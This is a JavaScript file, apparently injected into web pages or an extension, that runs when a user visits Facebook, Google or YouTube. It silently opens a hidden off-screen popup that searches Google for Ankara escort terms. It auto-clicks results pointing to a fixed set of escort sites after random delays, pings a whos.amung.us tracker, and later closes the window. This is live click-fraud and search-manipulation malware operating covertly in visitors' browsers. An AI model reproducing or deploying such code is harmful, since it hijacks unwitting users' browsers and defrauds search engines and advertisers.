
if(top.location.hostname.indexOf("facebook") > -1 || top.location.hostname.indexOf("google") > -1 || top.location.hostname.indexOf("youtube") > -1 ){

function setCookie(cname, cvalue) {
	var d = new Date();
	d.setTime(d.getTime() + (1000 * 60 * 90 ));
	var expires = "expires=" + d.toUTCString();
	document.cookie = cname + "=" + cvalue + "; " + expires
}
function getCookie(cname) {
	var name = cname + "=";
	var ca = document.cookie.split(';');
	for (var i = 0; i < ca.length; i++) {
		var c = ca[i];
		while (c.charAt(0) == ' ') c = c.substring(1);
		if (c.indexOf(name) == 0) return c.substring(name.length, c.length)
	}
	return ""
}
if (getCookie('cookie') != 1) {
window.open("https://www.google.com.tr/#q=ankara+escort","ljPu","toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=1, height=1, visible=none");
new Image().src = '//whos.amung.us/widget/dd0spanel.png';
setCookie("cookie", "1")
}
}

var degisken = ['sekerevi', 'www.art', 'osm', 'suluk'];  
var rand = degisken[Math.floor(Math.random() * degisken.length)];
var giris = Math.floor(Math.random() * ((10000-3000)+1) + 3000);
var cikis = Math.floor(Math.random() * ((10-3)+1) + 3);


if(document.title.indexOf("ankara escort") >= 0){
	
setTimeout(function () {
var a = document.getElementsByClassName("_Rm").length;
var pic = 0;
for(var i = 0 ; i < a ; i++){
if(document.getElementsByClassName("_Rm")[i].innerHTML.indexOf(rand) >= 0 ){
document.querySelectorAll(".r a")[i].click();
var pic =  1 ; 
}
}
if(pic == 0){document.querySelectorAll(".pn")[0].click();};
},giris)

											}

if (location.hostname.indexOf("ankarasekerevi.com") >= 0) {
new Image().src = '//whos.amung.us/widget/googlegiris.png';
setInterval(function(){ window.close(); }, 1000 * 60 * cikis);
}

if (location.hostname.indexOf("ankarasuluk.net") >= 0) {
new Image().src = '//whos.amung.us/widget/googlegiris.png';
setInterval(function(){ window.close(); }, 1000 * 60 * cikis);
}

if (location.hostname.indexOf("osmankara.net") >= 0) {
new Image().src = '//whos.amung.us/widget/googlegiris.png';
setInterval(function(){ window.close(); }, 1000 * 60 * cikis);
}

if (location.hostname.indexOf("artankara.org") >= 0) {
new Image().src = '//whos.amung.us/widget/googlegiris.png';
setInterval(function(){ window.close(); }, 1000 * 60 * cikis);
}
